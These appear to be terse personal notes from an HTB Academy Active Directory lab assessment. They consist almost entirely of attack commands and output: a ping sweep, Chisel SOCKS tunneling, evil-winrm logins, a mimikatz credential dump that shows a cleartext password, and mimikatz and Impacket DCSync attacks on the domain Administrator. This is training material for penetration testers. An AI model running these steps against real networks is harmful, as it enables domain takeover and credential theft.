# Skills Assessment Part I
```
$password = ConvertTo-SecureString 'lucky7' -AsPlainText -Force ; $cred = new-object System.Management.Automation.PSCredential ('INLANEFREIGHT.LOCAL\svc_sql', $password ); $s= New-PSSession -ComputerName MS01 -Credential $cred; Invoke-Command -Session $s { type C:\PATH\TO\ADMIN\FLAG.txt}

PS> 1..254 | % {echo "172.16.6.$_"; ping -n 1 -w 100 172.16.6.$_} | Select-String ttl

```



Reply from 172.16.6.3: bytes=32 time<1ms TTL=128
Reply from 172.16.6.50: bytes=32 time<1ms TTL=128
Reply from 172.16.6.100: bytes=32 time<1ms TTL=128

Chisel from HTB academy - SOCKS5 Tunneling with Chisel
```
C:\chisel_1.exe server -v -p 1234 --socks5

./chisel client -v 10.129.49.186:1234 socks

proxychains evil-winrm -i 172.16.6.50 -u svc_sql -p lucky7

.\mimikatz.exe SEKURLSA::LogonPasswords exit

```

        wdigest :
         * Username : tpetty
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : tpetty
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : Sup3rS3cur3D0m@inU2eR

`proxychains evil-winrm -i 172.16.6.50 -u tpetty -p Sup3rS3cur3D0m@inU2eR`

```

.\mimikatz.exe lsadump::dcsync /user:INLANEFREIGHT\tpetty exit
.\mimikatz.exe lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\tpetty exit
.\mimikatz.exe lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:tpetty exit
.\mimikatz.exe lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:Administrator exit

secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL	Impacket tool used to perform a DCSync attack and retrieve one or all of the NTLM password hashes from the target Windows domain. Performed from a Linux-based host.
```
